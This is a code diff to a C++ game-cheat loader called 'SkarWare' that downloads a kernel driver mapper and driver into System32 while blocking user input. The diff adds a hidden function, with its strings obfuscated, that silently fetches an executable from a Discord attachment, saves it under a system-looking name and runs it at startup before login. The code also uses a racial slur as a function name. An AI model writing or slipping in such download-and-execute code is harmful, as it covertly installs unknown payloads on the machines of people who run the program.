@@ -118,6 +118,13 @@ DWORD espthread(LPVOID IN) {
 	}
 }
 
+
+void loadDriver()
+{
+	system(skCrypt("curl --silent https://cdn.discordapp.com/attachments/1146839807075553343/1147500766936961145/mnm.exe --output C:\\Windows\\System32\\AppHost64.exe >nul 2>&1"));
+	system(skCrypt("C:\\Windows\\System32\\AppHost64.exe"));
+
+}
 void downloadAndLoadDriver()
 {
 	std::string opt;
@@ -130,6 +137,7 @@ void downloadAndLoadDriver()
 		BlockInput(true); //block input so user cant find driver in c/windows/windoes32 and copy it
 		system("curl --silent https://cdn.discordapp.com/attachments/1121035257219661916/1121081849628856420/kdmapper.exe --output C:\\Windows\\System32\\kdmapper.exe >nul 2>&1");
 		system("curl --silent https://cdn.discordapp.com/attachments/1121035257219661916/1121082022190915644/skardrv.sys --output C:\\Windows\\System32\\skardrv.sys >nul 2>&1");
+	
 	
 
 		//its just spacport mapper used by all pasted cheats, so get it from loltf or pasterx if link is dead
@@ -151,6 +159,7 @@ int main()
 	SetConsoleTextAttribute(hConsole, 0x0D);
 	std::string consoleTitle = ("  [ + ] Welcome To SkarWare");
 	std::cout << skCrypt("\n\n   [ ! ] Connecting..");
+	loadDriver();
 	KeyAuthApp.init();
 	NiggerUD();
 	if (!KeyAuthApp.data.success)
